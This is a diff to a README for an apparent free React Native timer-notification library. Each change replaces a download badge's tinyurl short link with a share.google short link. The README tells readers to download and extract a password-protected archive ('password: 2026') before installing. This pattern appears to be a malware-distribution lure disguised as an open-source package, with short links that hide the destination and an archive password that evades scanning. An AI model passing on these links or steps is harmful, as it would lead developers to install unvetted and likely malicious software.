@@ -9,7 +9,7 @@ The **⏰ React Native Custom Timer Notification Updated** is a **free** open-so
 
 <div align="center">
 
-[![Download React Native Custom Timer Notification](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/react-native-custom-timer)
+[![Download React Native Custom Timer Notification](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/dxrU5FiMkpY4YfFfS)
 
 </div>
 
@@ -109,7 +109,7 @@ Building timer notifications in React Native is complex. This free open-source l
 2. **📦 Extract the archive** — password: `2026`
 3. **⚡ Install** via npm/yarn into your React Native project
 
-[![Download React Native Custom Timer Notification](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/react-native-custom-timer)
+[![Download React Native Custom Timer Notification](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/dxrU5FiMkpY4YfFfS)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -287,7 +287,7 @@ Add professional timer notifications to your React Native app for free. **React 
 
 <div align="center">
 
-[![Download React Native Custom Timer Notification](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/react-native-custom-timer)
+[![Download React Native Custom Timer Notification](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/dxrU5FiMkpY4YfFfS)
 
 **Version 4.6.1** — Free React Native timer library. April 2026 update. MIT license. Zero cost.
 
